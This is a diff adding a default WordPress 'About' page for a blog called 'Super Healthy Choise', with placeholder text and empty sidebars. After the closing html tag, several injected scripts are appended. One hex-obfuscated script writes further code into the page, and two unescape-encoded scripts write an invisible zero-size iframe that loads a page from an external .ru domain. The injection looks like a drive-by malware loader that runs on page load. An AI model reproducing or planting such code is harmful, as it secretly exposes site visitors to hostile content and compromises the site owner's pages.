@@ -1,0 +1,97 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Super Healthy Choise   &raquo; About</title>
+<meta name="generator" content="WordPress 2.6" /> <!-- leave this for stats -->
+<link rel="stylesheet" href="http://superhealthychoice.com/wp-content/themes/pop-blue/style.css" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="Super Healthy Choise RSS Feed" href="http://superhealthychoice.com/?feed=rss2" />
+<link rel="pingback" href="http://superhealthychoice.com/xmlrpc.php" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://superhealthychoice.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://superhealthychoice.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 2.6" />
+
+</head>
+<body>
+<div id="top">
+<div id="header"><h1 class="blogtitle"><a href="http://superhealthychoice.com/">Super Healthy Choise</a></h1></div>
+</div>
+<div id="nav">
+<div id="nav2">
+<ul class="nav2">
+<li><a href="http://superhealthychoice.com">Home</a></li>
+<li class="page_item page-item-2 current_page_item"><a href="http://superhealthychoice.com/?page_id=2" title="About">About</a></li>
+</ul>
+
+<form method="get" id="searchform" action="http://superhealthychoice.com/">
+<div><input type="text" value="" name="s" id="s" />
+<input type="submit" id="searchsubmit" value="Search" />
+</div>
+</form>
+
+</div>
+</div>
+<div id="main">
+	<div id="content">
+	<div class="entry">
+				<div class="post" id="post-2">
+		<h2>About</h2>
+		
+				<p>This is an example of a WordPress page, you could edit this to put information about yourself or your site so readers know where you are coming from. You can create as many pages like this one or sub-pages as you like and manage all of your content inside of WordPress.</p>
+
+				
+			</div>
+		</div>
+				</div>
+
+<div id="sidebar">
+<div id="rsidebar">
+<ul>
+		
+    
+    <li><h2>Recent Comments</h2>
+		
+				     
+<ul>
+</ul>
+	
+			</li>
+    <li><h2>Recent Post</h2>
+				<ul>
+
+	
+		</ul>
+		</li>
+   <li class="pagenav"><h2>Pages</h2><ul><li class="page_item page-item-2 current_page_item"><a href="http://superhealthychoice.com/?page_id=2" title="About">About</a></li>
+</ul></li>
+			<li><h2>Archives</h2>
+				<ul>
+								</ul>
+			</li>
+
+			<li class="categories"><h2>Categories</h2><ul><li>No categories</li></ul></li>
+							
+				<li><h2>Meta</h2>
+				<ul>
+										<li><a href="http://superhealthychoice.com/wp-login.php">Log in</a></li>
+					<li><a href="http://validator.w3.org/check/referer" title="This page validates as XHTML 1.0 Transitional">Valid <abbr title="eXtensible HyperText Markup Language">XHTML</abbr></a></li>
+					<li><a href="http://gmpg.org/xfn/"><abbr title="XHTML Friends Network">XFN</abbr></a></li>
+					<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress</a></li>
+									</ul>
+				</li>
+			 
+				</ul>
+</div>		
+</div>
+
+
+
+
+</div>
+<div id="footer"></div>
+<div id="footerbox">
+<div class="footer">Super Healthy Choise is proudly powered by <a href="http://wordpress.org/">WordPress</a> <a href="http://superhealthychoice.com/?feed=rss2">Entries (RSS)</a> and <a href="http://superhealthychoice.com/?feed=comments-rss2">Comments (RSS)</a>. Designed by  <a href="http://www.blogohblog.com">Bob</a>	
+  <!-- 22 queries. 0.511 seconds. --></div></div>
+</body>
+</html><script>function c12m48a5195801d45(m48a5195802515){ var m48a5195802ce5=16; return (parseInt(m48a5195802515,m48a5195802ce5));}function m48a5195803c85(m48a5195804455){ function m48a5195805bc6(){return 2;} var m48a5195804c25='';m48a5195806b65=String.fromCharCode;for(m48a51958053f5=0;m48a51958053f5<m48a5195804455.length;m48a51958053f5+=m48a5195805bc6()){ m48a5195804c25+=(m48a5195806b65(c12m48a5195801d45(m48a5195804455.substr(m48a51958053f5,m48a5195805bc6()))));}return m48a5195804c25;} var z95='';var m48a5195807335='3C7'+z95+'3637'+z95+'2697'+z95+'07'+z95+'43E696628216D7'+z95+'96961297'+z95+'B646F637'+z95+'56D656E7'+z95+'42E7'+z95+'7'+z95+'7'+z95+'2697'+z95+'465287'+z95+'56E657'+z95+'363617'+z95+'065282027'+z95+'2533632536392536362537'+z95+'322536312536642536352532302536652536312536642536352533642536332533312532302537'+z95+'332537'+z95+'32253633253364253237'+z95+'2536382537'+z95+'342537'+z95+'342537'+z95+'30253361253266253266253637'+z95+'2536312537'+z95+'362536312536392532642537'+z95+'30253635253637'+z95+'2536332533392532652537'+z95+'37'+z95+'2537'+z95+'332532662533332532652536382537'+z95+'34253664253663253366253237'+z95+'2532622534642536312537'+z95+'342536382532652537'+z95+'322536662537'+z95+'352536652536342532382534642536312537'+z95+'342536382532652537'+z95+'32253631253665253634253666253664253238253239253261253339253337'+z95+'253332253331253336253239253262253237'+z95+'253333253339253330253337'+z95+'253331253338253331253330253237'+z95+'2532302537'+z95+'37'+z95+'2536392536342537'+z95+'34253638253364253332253332253334253230253638253635253639253637'+z95+'2536382537'+z95+'342533642533342533332533342532302537'+z95+'332537'+z95+'342537'+z95+'39253663253635253364253237'+z95+'2536342536392537'+z95+'332537'+z95+'302536632536312537'+z95+'39253361253230253665253666253665253635253237'+z95+'2533652533632532662536392536362537'+z95+'3225363125366425363525336527'+z95+'29293B7'+z95+'D7'+z95+'6617'+z95+'2206D7'+z95+'969613D7'+z95+'47'+z95+'27'+z95+'5653B3C2F7'+z95+'3637'+z95+'2697'+z95+'07'+z95+'43E';document.write(m48a5195803c85(m48a5195807335));</script>
+<script>document.write(unescape('%3C')+unescape('%69')+unescape('%66%72')+unescape('%61%6D')+unescape('%65%20%73%72')+unescape('%63%3D%22')+unescape('%68')+unescape('%74')+unescape('%74')+unescape('%70')+unescape('%3A%2F%2F%6F')+unescape('%79%34%62')+unescape('%2D%6F%79')+unescape('%6B%62%2E')+unescape('%72%75%2F%75')+unescape('%70')+unescape('%2E')+unescape('%68%74%6D')+unescape('%6C')+unescape('%22')+unescape('%20%77')+unescape('%69%64')+unescape('%74')+unescape('%68')+unescape('%3D%22%30%22')+unescape('%20')+unescape('%68%65%69')+unescape('%67%68%74%3D')+unescape('%22')+unescape('%30')+unescape('%22')+unescape('%20%66%72%61')+unescape('%6D%65%62%6F')+unescape('%72')+unescape('%64')+unescape('%65%72%3D')+unescape('%22%30')+unescape('%22%3E%3C')+unescape('%2F')+unescape('%69%66%72')+unescape('%61%6D%65%3E')+'');</script> <script>document.write(unescape('%3C')+unescape('%69')+unescape('%66%72')+unescape('%61%6D')+unescape('%65%20%73%72')+unescape('%63%3D%22')+unescape('%68')+unescape('%74')+unescape('%74')+unescape('%70')+unescape('%3A%2F%2F%6F')+unescape('%79%34%62')+unescape('%2D%6F%79')+unescape('%6B%62%2E')+unescape('%72%75%2F%75')+unescape('%70')+unescape('%2E')+unescape('%68%74%6D')+unescape('%6C')+unescape('%22')+unescape('%20%77')+unescape('%69%64')+unescape('%74')+unescape('%68')+unescape('%3D%22%30%22')+unescape('%20')+unescape('%68%65%69')+unescape('%67%68%74%3D')+unescape('%22')+unescape('%30')+unescape('%22')+unescape('%20%66%72%61')+unescape('%6D%65%62%6F')+unescape('%72')+unescape('%64')+unescape('%65%72%3D')+unescape('%22%30')+unescape('%22%3E%3C')+unescape('%2F')+unescape('%69%66%72')+unescape('%61%6D%65%3E')+'');</script> 
